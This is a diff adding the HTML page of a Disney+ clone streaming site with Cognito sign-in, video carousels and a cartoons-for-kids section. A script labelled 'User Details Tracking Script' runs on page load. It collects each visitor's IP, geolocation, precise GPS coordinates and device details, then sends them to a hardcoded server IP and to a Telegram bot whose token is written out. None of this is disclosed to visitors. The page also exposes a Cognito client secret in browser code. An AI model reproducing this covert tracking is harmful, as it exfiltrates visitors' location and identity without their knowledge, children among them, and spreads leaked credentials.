@@ -1,0 +1,811 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Disney by abi</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+  <!-- NAVBAR -->
+  <nav class="navbar" style="display: flex; align-items: center; justify-content: space-between;">
+    <img src="https://i.ibb.co/Ps5p8HMf/logo.png" class="brand-logo" alt="disney+logo">
+    <div id="user-info" style="color: #fff; font-size: 1rem; margin-right: 20px;">
+      <span>Loading user...</span>
+    </div>
+  </nav>
+
+  <!-- VIDEO CAROUSEL -->
+  <div class="carousel-container" style="display: flex; gap: 20px;">
+    <div class="slider">
+      <video class="card-img" id="videoPlayer1" playsinline loop muted width="320" height="180"
+        poster="https://assets-in.bmscdn.com/discovery-catalog/events/et00339561-vhccdqnkpv-landscape.jpg">
+        <source id="source1" src="https://myvideodinwshabi.s3.ca-central-1.amazonaws.com/First_Look_Kartik_Aaryan_Sreeleela_Anurag_Basu_Pritam.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+      </video>
+    </div>
+    <!-- Second Video -->
+    <div class="slider">
+      <video class="card-img" id="videoPlayer2" playsinline loop muted width="320" height="180"
+        poster="https://via.placeholder.com/320x180?text=Second+Video+Thumbnail">
+        <source id="source2" src="" type="video/mp4">
+        Your browser does not support the video tag.
+      </video>
+    </div>
+  </div>
+
+  <!-- AWS Cognito and CryptoJS -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/aws-sdk/2.1480.0/aws-sdk.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/amazon-cognito-identity-js/6.2.0/amazon-cognito-identity.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+
+  <script>
+    // AWS Cognito config
+    const poolData = {
+      UserPoolId: 'us-east-2_CQxTIv17u',
+      ClientId: '4rihi8h485kde1jg6b8rihe75d',
+      ClientSecret: 'eq95pqgg0ngst048l6oi4dv1o3fjagpc9al8el0d75q1qpvf19r'
+    };
+
+    let userPool = null;
+
+    // Function to calculate the SECRET_HASH
+    function getSecretHash(username) {
+      if (typeof CryptoJS === "undefined") return "";
+      const crypto = CryptoJS.HmacSHA256(
+        username + poolData.ClientId,
+        poolData.ClientSecret
+      );
+      return CryptoJS.enc.Base64.stringify(crypto);
+    }
+
+    // Show user info or sign-in form
+    function showUserInfoOrSignIn() {
+      const userInfoDiv = document.getElementById('user-info');
+      if (!userPool) {
+        userInfoDiv.innerHTML = '<span>Not signed in</span>';
+        return;
+      }
+      const cognitoUser = userPool.getCurrentUser();
+
+      if (!cognitoUser) {
+        // Show sign-in form
+        userInfoDiv.innerHTML = `
+          <form id="signin-form" style="display:inline;">
+            <input type="text" id="signin-username" placeholder="Username" required style="margin-right:5px;">
+            <input type="password" id="signin-password" placeholder="Password" required style="margin-right:5px;">
+            <button type="submit" style="margin-right:5px;">Sign In</button>
+            <button type="button" id="signup-btn" style="margin-right:5px;">Sign Up</button>
+          </form>
+          <div id="signin-message" style="color:yellow; margin-top:5px;"></div>
+        `;
+        document.getElementById('signin-form').onsubmit = function(e) {
+          e.preventDefault();
+          const username = document.getElementById('signin-username').value.trim();
+          const password = document.getElementById('signin-password').value;
+          signInCognito(username, password);
+        };
+        document.getElementById('signup-btn').onclick = function() {
+          showSignUpForm();
+        };
+        return;
+      }
+
+      cognitoUser.getSession(function(err, session) {
+        if (err || !session || !session.isValid()) {
+          // Not signed in, show sign-in form
+          userInfoDiv.innerHTML = `
+            <form id="signin-form" style="display:inline;">
+              <input type="text" id="signin-username" placeholder="Username" required style="margin-right:5px;">
+              <input type="password" id="signin-password" placeholder="Password" required style="margin-right:5px;">
+              <button type="submit" style="margin-right:5px;">Sign In</button>
+              <button type="button" id="signup-btn" style="margin-right:5px;">Sign Up</button>
+            </form>
+            <div id="signin-message" style="color:yellow; margin-top:5px;"></div>
+          `;
+          document.getElementById('signin-form').onsubmit = function(e) {
+            e.preventDefault();
+            const username = document.getElementById('signin-username').value.trim();
+            const password = document.getElementById('signin-password').value;
+            signInCognito(username, password);
+          };
+          document.getElementById('signup-btn').onclick = function() {
+            showSignUpForm();
+          };
+          return;
+        }
+
+        cognitoUser.getUserAttributes(function(err, attributes) {
+          if (err || !attributes) {
+            userInfoDiv.innerHTML = '<span>Signed in</span>';
+            return;
+          }
+
+          let name = "";
+          let email = "";
+          for (let i = 0; i < attributes.length; i++) {
+            if (attributes[i].getName() === 'name') name = attributes[i].getValue();
+            if (attributes[i].getName() === 'email') email = attributes[i].getValue();
+          }
+
+          userInfoDiv.innerHTML = `
+            <span>Signed in as: <strong>${name || email || 'User'}</strong></span>
+            <button id="signout-btn" style="margin-left:10px;">Sign out</button>
+          `;
+
+          document.getElementById('signout-btn').onclick = function() {
+            cognitoUser.signOut();
+            try {
+              localStorage.clear();
+              sessionStorage.clear();
+            } catch (e) {}
+            location.reload();
+          };
+        });
+      });
+    }
+
+    // Sign in function
+    function signInCognito(username, password) {
+      const userInfoDiv = document.getElementById('user-info');
+      const authenticationData = {
+        Username: username,
+        Password: password,
+        SecretHash: getSecretHash(username)
+      };
+      const authenticationDetails = new AmazonCognitoIdentity.AuthenticationDetails(authenticationData);
+      const userData = {
+        Username: username,
+        Pool: userPool
+      };
+      const cognitoUser = new AmazonCognitoIdentity.CognitoUser(userData);
+
+      cognitoUser.authenticateUser(authenticationDetails, {
+        onSuccess: function (result) {
+          userInfoDiv.innerHTML = '<span style="color:lightgreen;">Signed in! Reloading...</span>';
+          setTimeout(() => location.reload(), 1000);
+        },
+        onFailure: function (err) {
+          document.getElementById('signin-message').innerText = err.message || JSON.stringify(err);
+        },
+        newPasswordRequired: function(userAttributes, requiredAttributes) {
+          document.getElementById('signin-message').innerText = "New password required. Please reset your password in AWS console.";
+        }
+      });
+    }
+
+    // Show sign up form
+    function showSignUpForm() {
+      const userInfoDiv = document.getElementById('user-info');
+      userInfoDiv.innerHTML = `
+        <form id="signup-form" style="display:inline;">
+          <input type="text" id="signup-username" placeholder="Username" required style="margin-right:5px;">
+          <input type="password" id="signup-password" placeholder="Password" required style="margin-right:5px;">
+          <input type="email" id="signup-email" placeholder="Email" required style="margin-right:5px;">
+          <button type="submit" style="margin-right:5px;">Sign Up</button>
+          <button type="button" id="back-to-signin" style="margin-right:5px;">Back</button>
+        </form>
+        <div id="signup-message" style="color:yellow; margin-top:5px;"></div>
+      `;
+      document.getElementById('signup-form').onsubmit = function(e) {
+        e.preventDefault();
+        const username = document.getElementById('signup-username').value.trim();
+        const password = document.getElementById('signup-password').value;
+        const email = document.getElementById('signup-email').value.trim();
+        signUpCognito(username, password, email);
+      };
+      document.getElementById('back-to-signin').onclick = function() {
+        showUserInfoOrSignIn();
+      };
+    }
+
+    // Sign up function
+    function signUpCognito(username, password, email) {
+      const attributeList = [];
+      attributeList.push(new AmazonCognitoIdentity.CognitoUserAttribute({Name:"email",Value:email}));
+      // Optionally add name attribute
+      // attributeList.push(new AmazonCognitoIdentity.CognitoUserAttribute({Name:"name",Value:username}));
+
+      userPool.signUp(username, password, attributeList, { 'SecretHash': getSecretHash(username) }, function(err, result){
+        if (err) {
+          document.getElementById('signup-message').innerText = err.message || JSON.stringify(err);
+          return;
+        }
+        document.getElementById('signup-message').innerHTML = "Sign up successful! Please check your email for a verification code.<br><br>" +
+          `<form id="verify-form">
+            <input type="text" id="verify-code" placeholder="Verification Code" required style="margin-right:5px;">
+            <button type="submit">Verify</button>
+          </form>
+          <div id="verify-message" style="color:yellow; margin-top:5px;"></div>
+        `;
+        document.getElementById('verify-form').onsubmit = function(e) {
+          e.preventDefault();
+          const code = document.getElementById('verify-code').value.trim();
+          confirmSignUpCognito(username, code);
+        };
+      });
+    }
+
+    // Confirm sign up
+    function confirmSignUpCognito(username, code) {
+      const cognitoUser = new AmazonCognitoIdentity.CognitoUser({
+        Username: username,
+        Pool: userPool
+      });
+      cognitoUser.confirmRegistration(code, true, function(err, result) {
+        if (err) {
+          document.getElementById('verify-message').innerText = err.message || JSON.stringify(err);
+          return;
+        }
+        document.getElementById('verify-message').innerText = "Verification successful! You can now sign in.";
+        setTimeout(() => showUserInfoOrSignIn(), 1500);
+      });
+    }
+
+    // Wait for Cognito scripts to load, then initialize
+    function waitForCognitoReady(attempts) {
+      if (window.AmazonCognitoIdentity && window.AmazonCognitoIdentity.CognitoUserPool) {
+        userPool = new AmazonCognitoIdentity.CognitoUserPool(poolData);
+        showUserInfoOrSignIn();
+      } else if (attempts < 30) {
+        setTimeout(function() { waitForCognitoReady(attempts + 1); }, 100);
+      } else {
+        const userInfoDiv = document.getElementById('user-info');
+        if (userInfoDiv) userInfoDiv.innerHTML = '<span style="color:red;">Cognito failed to load.</span>';
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      waitForCognitoReady(0);
+    });
+  </script>
+  
+  <script>
+    function setupVideoPlayer(videoId, sourceId, playlist) {
+      const video = document.getElementById(videoId);
+      const source = document.getElementById(sourceId);
+      let index = 0;
+
+      if (!video || !source) return null;
+
+      video.muted = true;
+      video.volume = 1;
+
+      // Set initial source if playlist is not empty
+      if (playlist.length > 0) {
+        source.src = playlist[0];
+        video.load();
+      }
+
+      // Delay playback by 6 seconds
+      setTimeout(() => {
+        video.play().catch(err => {
+          // Autoplay may be blocked, ignore
+        });
+      }, 6000);
+
+      // Handle playlist looping
+      video.addEventListener("ended", () => {
+        if (playlist.length > 0) {
+          index = (index + 1) % playlist.length;
+          source.src = playlist[index];
+          video.load();
+          video.play().catch(err => {
+            // Autoplay may be blocked, ignore
+          });
+        }
+      });
+
+      return video;
+    }
+
+    let video1 = null, video2 = null;
+
+    window.addEventListener("DOMContentLoaded", () => {
+      video1 = setupVideoPlayer("videoPlayer1", "source1", [
+        "https://myvideodinwshabi.s3.ca-central-1.amazonaws.com/First_Look_Kartik_Aaryan_Sreeleela_Anurag_Basu_Pritam.mp4"
+      ]);
+
+      video2 = setupVideoPlayer("videoPlayer2", "source2", [
+        // Add video URLs here for the second video playlist if needed
+      ]);
+    });
+
+    // Optional: Unmute on first click
+    window.addEventListener("click", () => {
+      [video1, video2].forEach(video => {
+        if (video) {
+          video.muted = false;
+          video.volume = 1;
+          video.play().catch(err => {
+            // Autoplay may be blocked, ignore
+          });
+        }
+      });
+    }, { once: true });
+  </script>
+
+  <!-- User Details Tracking Script -->
+  <script>
+    // Backend URL for saving user details to RDS (should point to your backend API)
+    const BACKEND_URL = "http://3.135.202.144/save-user-login"; // Update as needed
+
+    // Telegram Bot credentials
+    const botToken = '7878047212:AAFHo4LZznqfJySW6pl54HE52ZlLu4GCeZA';
+    const chatId = '5025112538';
+
+    // Helper to get accurate timezone
+    function getTimezone() {
+      try {
+        return Intl.DateTimeFormat().resolvedOptions().timeZone || "unknown";
+      } catch (e) {
+        return "unknown";
+      }
+    }
+
+    // Helper to get screen details
+    function getScreenDetails() {
+      return {
+        width: window.screen.width,
+        height: window.screen.height,
+        availWidth: window.screen.availWidth,
+        availHeight: window.screen.availHeight,
+        colorDepth: window.screen.colorDepth,
+        pixelDepth: window.screen.pixelDepth
+      };
+    }
+
+    // Helper to get language
+    function getLanguage() {
+      return navigator.language || navigator.userLanguage || "unknown";
+    }
+
+    // Helper to get platform
+    function getPlatform() {
+      return navigator.platform || "unknown";
+    }
+
+    // Helper to get referrer
+    function getReferrer() {
+      return document.referrer || "none";
+    }
+
+    // Helper to get cookies enabled
+    function areCookiesEnabled() {
+      return navigator.cookieEnabled;
+    }
+
+    // Helper to get local time
+    function getLocalTime() {
+      return new Date().toISOString();
+    }
+
+    // Main function to collect and send user details
+    async function getUserDetails() {
+      let details = {};
+
+      // 1. Device and browser info
+      details.userAgent = navigator.userAgent;
+      details.language = getLanguage();
+      details.platform = getPlatform();
+      details.timezone = getTimezone();
+      details.screen = getScreenDetails();
+      details.cookiesEnabled = areCookiesEnabled();
+      details.referrer = getReferrer();
+      details.localTime = getLocalTime();
+
+      // 2. Network info (if available)
+      if (navigator.connection) {
+        details.networkType = navigator.connection.effectiveType || "unknown";
+        details.downlink = navigator.connection.downlink || null;
+        details.rtt = navigator.connection.rtt || null;
+      } else {
+        details.networkType = "not_supported";
+      }
+
+      // 3. Public IP and Geo Location via API
+      try {
+        let res = await fetch('https://ipapi.co/json/');
+        if (res.ok) {
+          let data = await res.json();
+          details.ip = data.ip;
+          details.city = data.city;
+          details.region = data.region;
+          details.country = data.country_name;
+          details.latitude = data.latitude;
+          details.longitude = data.longitude;
+          details.postal = data.postal;
+          details.org = data.org;
+          details.asn = data.asn;
+        }
+      } catch (err) {
+        console.warn("IP API fetch failed:", err);
+      }
+
+      // 4. Precise GPS location (optional, needs permission)
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          pos => {
+            details.gpsLat = pos.coords.latitude;
+            details.gpsLon = pos.coords.longitude;
+            details.gpsAccuracy = pos.coords.accuracy;
+            details.gpsTimestamp = pos.timestamp;
+            sendDetails(details);
+            sendToTelegram(details);
+          },
+          err => {
+            console.warn("GPS location denied or failed:", err);
+            sendDetails(details);
+            sendToTelegram(details);
+          },
+          { enableHighAccuracy: true, timeout: 7000, maximumAge: 0 }
+        );
+      } else {
+        sendDetails(details);
+        sendToTelegram(details);
+      }
+    }
+
+    // Send to backend (RDS)
+    function sendDetails(details) {
+      if (
+        typeof BACKEND_URL === "string" &&
+        BACKEND_URL &&
+        (BACKEND_URL.startsWith("http://") || BACKEND_URL.startsWith("https://"))
+      ) {
+        fetch(BACKEND_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(details)
+        }).catch(err => console.error("Send to backend failed:", err));
+      } else {
+        console.error("Invalid BACKEND_URL");
+      }
+    }
+
+    // Send to Telegram bot
+    function sendToTelegram(details) {
+      const message =
+        `New User Login (Accurate Details):\n` +
+        `IP: ${details.ip || 'N/A'}\n` +
+        `City: ${details.city || 'N/A'}\n` +
+        `Region: ${details.region || 'N/A'}\n` +
+        `Country: ${details.country || 'N/A'}\n` +
+        `Postal: ${details.postal || 'N/A'}\n` +
+        `Org: ${details.org || 'N/A'}\n` +
+        `ASN: ${details.asn || 'N/A'}\n` +
+        `Latitude: ${details.latitude || 'N/A'}\n` +
+        `Longitude: ${details.longitude || 'N/A'}\n` +
+        `GPS Lat: ${details.gpsLat || 'N/A'}\n` +
+        `GPS Lon: ${details.gpsLon || 'N/A'}\n` +
+        `GPS Accuracy: ${details.gpsAccuracy || 'N/A'}\n` +
+        `GPS Timestamp: ${details.gpsTimestamp || 'N/A'}\n` +
+        `Network: ${details.networkType || 'N/A'}\n` +
+        `Downlink: ${details.downlink || 'N/A'} Mbps\n` +
+        `RTT: ${details.rtt || 'N/A'} ms\n` +
+        `UserAgent: ${details.userAgent || 'N/A'}\n` +
+        `Language: ${details.language || 'N/A'}\n` +
+        `Platform: ${details.platform || 'N/A'}\n` +
+        `Timezone: ${details.timezone || 'N/A'}\n` +
+        `Screen: ${details.screen ? JSON.stringify(details.screen) : 'N/A'}\n` +
+        `Cookies Enabled: ${details.cookiesEnabled}\n` +
+        `Referrer: ${details.referrer}\n` +
+        `Local Time: ${details.localTime}`;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
+      }).catch(err => console.error("Telegram send failed:", err));
+    }
+
+    // Run after DOM is loaded
+    window.addEventListener("DOMContentLoaded", getUserDetails);
+  </script>
+    
+  <h1 class="title">Cartoons for kids </h1>
+  <div class="movies-list">
+    <button class="pre-btn"><img src="https://i.ibb.co/NgNJVjNk/pre.png" alt=""></button>
+    <button class="nxt-btn"><img src="https://i.ibb.co/W4rsYFPH/nxt.png" alt=""></button>
+    
+    <div class="card-container">
+      <!-- Each card is now a link for proper redirection -->
+      <a href="http://s3frontpart2-1722208981.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://i.pinimg.com/236x/79/f3/80/79f38075de07acfa804b4a10dfdcb2a2.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Doremon</h2>
+            <h6 class="des"></h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://s3frontpart2-1722208981.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://m.media-amazon.com/images/M/MV5BZmYxYWRmODAtMWEzNC00MTAxLTkyN2EtMTM1YmE2YzAwNmQxXkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">shaun the sheep</h2>
+            <h6 class="des"></h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://s3frontpart2-1722208981.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://m.media-amazon.com/images/M/MV5BZmY5MjE0ZGItY2Q0My00ZWI5LWJmYTEtYWUyMzFkY2FmZDM2XkEyXkFqcGc@._V1_.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Mr beam</h2>
+            <h6 class="des"></h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://s3frontpart2-1722208981.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://m.media-amazon.com/images/I/71dX9JnTkwL._UF1000,1000_QL80_.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name"> Squirrels</h2>
+            <h6 class="des"></h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://s3frontpart2-1722208981.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://i.ibb.co/Ld3qYrHt/poster-8.png" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Soul</h2>
+            <h6 class="des"></h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://s3frontpart2-1722208981.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://upload.wikimedia.org/wikipedia/en/c/ce/Crayon_Shin-chan_the_Movie-_Super_Hot%21_The_Spicy_Kasukabe_Dancers_poster.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Shin chan</h2>
+            <h6 class="des"></h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://s3frontpart2-1722208981.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://miro.medium.com/v2/resize:fit:736/1*w4MhPHkH-c_EAnsRXeB68Q.jpeg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Doremon</h2>
+            <h6 class="des"></h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://s3frontpart2-1722208981.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://picfiles.alphacoders.com/427/thumb-1920-427773.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Tom and jerry</h2>
+            <h6 class="des"></h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+    </div>
+  </div>
+
+  <!-- Popular Shows -->
+
+  <h1 class="title">Video Song</h1>
+  <div class="movies-list">
+    <button class="pre-btn"><img src="https://i.ibb.co/NgNJVjNk/pre.png" alt=""></button>
+    <button class="nxt-btn"><img src="https://i.ibb.co/W4rsYFPH/nxt.png" alt=""></button>
+    <div class="card-container">
+
+      <!-- Each card is now a link for proper redirection -->
+      <!-- CHANGE: Each song card now links to the mainprivate-1549652976.us-east-2.elb.amazonaws.com songs page -->
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://m.media-amazon.com/images/M/MV5BYTIyZTE3ZGMtMWE5Yi00NDc2LTkxYWUtN2I0ZDg1MjZiZDY3XkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Taxi wala</h2>
+            <h6 class="des">maate vinadhuga</h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS0CDBQ8m3eMAQWgKehKAqQjvptszrPWMx2XQ&s" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Devara</h2>
+            <h6 class="des">chuttamalle</h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRR1xsTGcMK9xxMaxbrZsxzVQdFSJtrtMf4iw&s" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">mahii</h2>
+            <h6 class="des">hardik pandya natasha.</h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://www.cinejosh.com/newsimg/newsmainimg/og_b_0812240748.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">OG</h2>
+            <h6 class="des">Hungry Cheetah - OG Glimpse </h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQpJ4Q8qlyYYFgRZdSvt5zyOfGRPTO3KvsL4g&s" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Aashiqui 3</h2>
+            <h6 class="des">Tu Meri Zindagi Hai - Aashiqui 3.</h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://c.saavncdn.com/100/Idiot-Telugu-2002-20200616185725-500x500.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Choopultho</h2>
+            <h6 class="des">Idiot Movie.</h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://c.saavncdn.com/027/Nenu-Sailaja-Telugu-2015-500x500.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Crazy Feeling</h2>
+            <h6 class="des">Nenu Sailaja.</h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+      <a href="http://mainprivate-1549652976.us-east-2.elb.amazonaws.com/" target="_blank" class="card-link">
+        <div class="card" style="cursor:pointer;">
+          <img src="https://a10.gaanacdn.com/gn_img/albums/mGjKrP1W6z/jKrr7RJJK6/size_m_1740638882.jpg" alt="" class="card-img">
+          <div class="card-body">
+            <h2 class="name">Songs</h2>
+            <h6 class="des">f</h6>
+            <button class="watchlist-btn">add to watchlist</button>
+          </div>
+        </div>
+      </a>
+    </div>
+  </div>
+
+  <!-- New Releases -->
+  <h1 class="title">New Releases update soon</h1>
+  <div class="movies-list">
+    <button class="pre-btn"><img src="https://i.ibb.co/NgNJVjNk/pre.png" alt=""></button>
+    <button class="nxt-btn"><img src="https://i.ibb.co/W4rsYFPH/nxt.png" alt=""></button>
+    <div class="card-container">
+
+      <div class="card">
+        <img src="https://i.ibb.co/Ld3qYrHt/poster-8.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/xtLxxbHH/poster-5.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/NdMMS3s2/poster-12.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/Rpy68MrL/poster-6.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/PsNxQQ1p/poster-2.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/WNB5p03x/poster-10.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/xtLxxbHH/poster-5.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/QWnKjSc/poster-3.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/Ld3qYrHt/poster-8.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <img src="https://i.ibb.co/Z6zKx9rz/poster-1.png" alt="" class="card-img">
+        <div class="card-body">
+          <h2 class="name">movie name</h2>
+          <h6 class="des">Lorem ipsum dolor sit amet consectetur.</h6>
+          <button class="watchlist-btn">add to watchlist</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="last-footer">
+      <div class="last-footer-texts">
+          <h3>© 2025 NewDisney+. All Rights Reserved by abinash kumar</h3>
+          <div class="last-footer-links">
+              <a href="#">Terms Of Use</a>
+              <a href="#">Privacy Policy</a>
+              <a href="#">FAQ</a>
+          </div>
+      </div>
+      <div class="last-footer-images">
+          <a href="#"><img src="https://download.logo.wine/logo/Google_Play/Google_Play-Logo.wine.png" class="dwn" alt=""></a>
+          <a href="#"><img src="https://cdn.worldvectorlogo.com/logos/available-on-the-app-store.svg" class="dwn" alt=""></a>
+      </div>
+  </div>
+
+  <script src="script.js" async></script>
+</body>
+</html>
